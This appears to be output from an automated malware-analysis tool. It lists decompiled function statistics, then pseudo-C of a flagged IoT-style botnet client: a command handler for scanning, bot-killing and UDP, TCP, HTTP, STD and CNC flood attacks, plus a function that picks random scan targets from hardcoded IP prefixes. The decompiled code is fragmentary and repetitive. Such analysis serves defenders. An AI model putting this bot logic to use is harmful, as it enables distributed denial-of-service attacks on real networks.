__GI_mempcpy                                      |4   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_idivmod                                   |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |2   |177     |0             |0           |
----------------------------------------------------------------------------------------------
__floatdidf                                       |2   |173     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |174     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |174     |0             |0           |
----------------------------------------------------------------------------------------------
function_1b654                                    |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |206     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |0   |179     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |1   |178     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |214     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |1   |167     |0             |0           |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |179     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |187     |0             |0           |
----------------------------------------------------------------------------------------------
_24_d_1                                           |2   |199     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |236     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |0   |176     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |3   |193     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |4   |183     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |2   |173     |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |2   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |188     |0             |0           |
----------------------------------------------------------------------------------------------
call_frame_dummy                                  |0   |168     |0             |0           |
----------------------------------------------------------------------------------------------
__extendsfdf2                                     |1   |187     |0             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |0   |169     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |0   |0       |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |2   |185     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |186     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |1   |326     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |5   |179     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |0   |191     |0             |0           |
----------------------------------------------------------------------------------------------
__default_rt_sa_restorer                          |2   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__gtdf2                                           |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |2   |176     |0             |0           |
----------------------------------------------------------------------------------------------
function_1b170                                    |7   |279     |0             |0           |
----------------------------------------------------------------------------------------------
feof                                              |1   |183     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |171     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |3   |167     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_cdrcmple                                  |0   |167     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 14930
++++++++ FUNCTION END 18213
++++++++ FUNCTION LENGTH 3283
    if (__GI_strcoll((char *)*a2, (int32_t)"PING") == 0) {
        sockprintf(v159, (int32_t)"PONG!");
            getdtablesize();
            sockprintf(v159, (int32_t)"%d");
                    kill();
                    sockprintf(v159, (int32_t)"STOPPING SCANNER");
                        int32_t v163 = __libc_fork(); // 0x10894
                            __GI_inet_ntoa((int32_t *)v160);
                            sockprintf(v159, (int32_t)"STARTING SCANNER ON -> %s");
                if (listFork() == 0) {
                    __GI_inet_ntoa((int32_t *)v160);
                    botkiller(sockprintf(v159, (int32_t)"COMMENCING BOT KILL ON -> %s"));
            if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                __GI_inet_ntoa((int32_t *)v160);
                sockprintf(v159, (int32_t)"My Public IP: %s");
                if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                            return sockprintf(v159, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                        int32_t v181 = listFork(); // 0x10cf8
                                                            sendUDP(v180, v170, v171, v172, v173, v174, v176, v178);
                                                            while (true) {
                                                                if (listFork() == 0) {
                                                                    sendUDP(v182, v170, v171, v172, v173, v174, v176, v178);
                    sockprintf(v159, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                    result2 = sockprintf(v159, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                    result2 = sockprintf(v159, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                if (listFork() == 0) {
                                                    sendTCP(v234, v227, v228, v229, v235, v232, v230);
                                                    while (true) {
                                                        if (listFork() == 0) {
                                                            sendTCP(v236, v227, v228, v229, v235, v232, v230);
                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                if (listFork() == 0) {
                                                                    sendHTTP(*v184, v209, (char)(v188 % 0x10000), v211, v189, v190);
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v184, v204, (char)(v185 % 0x10000), v206, v186, v187);
                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") != 0) {
                                                                                                v241 = listFork();
                                                                                                    sendSTD(v220, v202, v203, 0);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v221, v202, v203, 0);
                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                    while (true) {
                                                                                result = sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                    while (true) {
                                                                                        result3 = listFork();
                                                                                            sendCNC(v218, v198, v199, 0);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendCNC(v219, v198, v199, 0);
                                                                                            __libc_close(v159);
                                                                                                        v241 = listFork();
                                                                                                            sendSTD(v220, v202, v203, 0);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v221, v202, v203, 0);
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                            while (true) {
                                                                                        result = sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                            while (true) {
                                                                        result4 = sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                                int32_t v244 = listFork(); // 0x112a0
                                                                                    sendHTTP2(v214, v215, (char)(v193 % 0x10000), v216, v194, v195);
                                                                                                            v241 = listFork();
                                                                                                                sendSTD(v220, v202, v203, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v221, v202, v203, 0);
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                while (true) {
                                                                                            result = sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                while (true) {
                                                                                                    result3 = listFork();
                                                                                                        sendCNC(v218, v198, v199, 0);
                                                                                                                        v241 = listFork();
                                                                                                                            sendSTD(v220, v202, v203, 0);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendSTD(v221, v202, v203, 0);
                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                            while (true) {
                                                                                                        result = sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                            while (true) {
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendCNC(v245, v198, v199, 0);
                                                                                                        __libc_close(v159);
                                                                                                                    v241 = listFork();
                                                                                                                        sendSTD(v220, v202, v203, 0);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendSTD(v247, v202, v203, 0);
                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                            while (true) {
                                                                                                                                            sockprintf(v159, (int32_t)"None Killed.");
                                                                                                                                            sockprintf(v159, (int32_t)"Killed %d.");
                                                                                                                                    if (*v251 != __libc_getpid()) {
                                                                                                                                        kill();
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                        while (true) {
                                                                                                    result = sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                        while (true) {
                                                                                    result4 = sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP2(v214, v215, (char)(v193 % 0x10000), v216, v194, v195);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendCNC(v218, v198, v199, 0);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendCNC(v219, v198, v199, 0);
                                                                                                                __libc_close(v159);
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendSTD(v220, v202, v203, 0);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() != 0) {
                                                                                                                                    sendSTD(v221, v202, v203, 0);
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                while (true) {
                                                                                                            sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                while (true) {
                                                                                        sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v220, v202, v203, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v221, v202, v203, 0);
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                while (true) {
                                                                                            sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                while (true) {
                                                                                        if (listFork() == 0) {
                                                                                            sendCNC(v218, v198, v199, 0);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v219, v198, v199, 0);
                                                                                                __libc_close(v159);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v220, v202, v203, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v221, v202, v203, 0);
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                while (true) {
                                                                                            sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                while (true) {
                                                                        sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v220, v202, v203, 0);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v221, v202, v203, 0);
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                while (true) {
                                                                            sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                while (true) {
                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP2(v214, v215, (char)(v193 % 0x10000), v216, v194, v195);
                                                                                                if (listFork() == 0) {
                                                                                                    sendCNC(v218, v198, v199, 0);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v219, v198, v199, 0);
                                                                                                        __libc_close(v159);
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendSTD(v220, v202, v203, 0);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendSTD(v221, v202, v203, 0);
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                        while (true) {
                                                                                                    sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                        while (true) {
                                                                                sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v220, v202, v203, 0);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v221, v202, v203, 0);
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                        while (true) {
                                                                                    sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                        while (true) {
                                                                                if (listFork() == 0) {
                                                                                    sendCNC(v218, v198, v199, 0);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v219, v198, v199, 0);
                                                                                        __libc_close(v159);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v220, v202, v203, 0);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v221, v202, v203, 0);
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                        while (true) {
                                                                                    sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                        while (true) {
                                                                sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v220, v202, v203, 0);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v221, v202, v203, 0);
                                                                    sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v184, v209, (char)(v188 % 0x10000), v211, v189, v190);
                                                            while (true) {
                                                                if (listFork() != 0) {
                                                                sendHTTP(*v184, v204, (char)(v185 % 0x10000), v206, v186, v187);
                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP2(v214, v215, (char)(v193 % 0x10000), v216, v194, v195);
                                                                                                if (listFork() == 0) {
                                                                                                    sendCNC(v218, v198, v199, 0);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendCNC(v219, v198, v199, 0);
                                                                                                        __libc_close(v159);
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendSTD(v220, v202, v203, 0);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendSTD(v221, v202, v203, 0);
                                                                                                    sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v220, v202, v203, 0);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v221, v202, v203, 0);
                                                                                    sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                                if (listFork() == 0) {
                                                                                    sendCNC(v218, v198, v199, 0);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendCNC(v219, v198, v199, 0);
                                                                                        __libc_close(v159);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v220, v202, v203, 0);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendSTD(v221, v202, v203, 0);
                                                                                    sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v220, v202, v203, 0);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v221, v202, v203, 0);
                                                                    sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                if (listFork() == 0) {
                                                                    sendHTTP2(v214, v215, (char)(v193 % 0x10000), v216, v194, v195);
                                                                                        if (listFork() == 0) {
                                                                                            sendCNC(v218, v198, v199, 0);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendCNC(v219, v198, v199, 0);
                                                                                                __libc_close(v159);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v220, v202, v203, 0);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendSTD(v221, v202, v203, 0);
                                                                                            sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                        sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v220, v202, v203, 0);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v221, v202, v203, 0);
                                                                            sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                                        if (listFork() == 0) {
                                                                            sendCNC(v218, v198, v199, 0);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendCNC(v219, v198, v199, 0);
                                                                                __libc_close(v159);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v220, v202, v203, 0);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v221, v202, v203, 0);
                                                                            sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                        sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                            if (listFork() == 0) {
                                                                                sendSTD(v220, v202, v203, 0);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendSTD(v221, v202, v203, 0);
                                                            sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                        sockprintf(v159, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                    if (listFork() == 0) {
                                        sendHTTP(*v184, v209, (char)(v188 % 0x10000), v211, v189, v190);
                                        while (true) {
                                            if (listFork() != 0) {
                                            sendHTTP(*v184, v204, (char)(v185 % 0x10000), v206, v186, v187);
                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                    if (listFork() == 0) {
                                                        sendHTTP2(v214, v215, (char)(v193 % 0x10000), v216, v194, v195);
                                                                            if (listFork() == 0) {
                                                                                sendCNC(v218, v198, v199, 0);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendCNC(v219, v198, v199, 0);
                                                                                    __libc_close(v159);
                                                                                                if (listFork() == 0) {
                                                                                                    sendSTD(v220, v202, v203, 0);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v221, v202, v203, 0);
                                                                                sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                            sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                                if (listFork() == 0) {
                                                                                    sendSTD(v220, v202, v203, 0);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendSTD(v221, v202, v203, 0);
                                                                sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                                            if (listFork() == 0) {
                                                                sendCNC(v218, v198, v199, 0);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendCNC(v219, v198, v199, 0);
                                                                    __libc_close(v159);
                                                                                if (listFork() == 0) {
                                                                                    sendSTD(v220, v202, v203, 0);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendSTD(v221, v202, v203, 0);
                                                                sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                                            sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                                if (listFork() == 0) {
                                                                    sendSTD(v220, v202, v203, 0);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendSTD(v221, v202, v203, 0);
                                                sockprintf(v159, (int32_t)"STD <target> <port> <time>");
                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                            if (listFork() == 0) {
                                                sendHTTP2(v214, v215, (char)(v193 % 0x10000), v216, v194, v195);
                                                                    if (listFork() == 0) {
                                                                        sendCNC(v218, v198, v199, 0);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendCNC(v219, v198, v199, 0);
                                                                            __libc_close(v159);
                                                    sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
                                                    if (listFork() == 0) {
                                                        sendCNC(v218, v198, v199, 0);
                                                        while (true) {
                                                            if (listFork() != 0) {
                                                            sendCNC(v219, v198, v199, 0);
                                                            __libc_close(v159);
                                    sockprintf(v159, (int32_t)"CNC <target> <port> <time>");
=================FUNCTION : GetRandomPublicIP ===================
++++++++ FUNCTION START 9576
++++++++ FUNCTION END 10994
++++++++ FUNCTION LENGTH 1418
    random();
    random();
    v165 = random() % 255;
    v166 = random() % 255;
    int32_t v167 = random() % 208; // 0xab54
        szprintf(v164, (int32_t)"112.5.%d.%d", (int32_t)v165, (int32_t)v166, 0);
        szprintf(v164, (int32_t)"117.165.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"85.3.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"37.158.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"95.9.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"41.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"58.71.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"104.55.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"78.186.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"78.189.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"221.120.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"88.5.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"41.254.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.20.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.47.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.57.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"45.117.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"101.51.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"137.59.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"1.56.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"1.188.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.204.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"27.0.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"27.8.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"27.50.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"27.54.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"27.98.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"27.112.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"27.192.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"36.32.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"36.248.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"39.64.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"42.4.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"42.48.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"42.52.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"42.56.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"42.63.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"42.84.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"42.176.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"42.224.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"42.176.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"43.253.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"43.230.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"163.53.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"43.230.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"62.252.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"43.245.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"62.255.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"123.25.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.54.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"27.255.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"103.204.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"123.24.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.191.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"81.100.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.188.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"113.189.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"94.174.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.160.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.161.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.162.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.163.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.164.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.165.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.166.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
        szprintf(v164, (int32_t)"14.167.%d.%d", (int32_t)v165, (int32_t)v166, (int32_t)&v168);
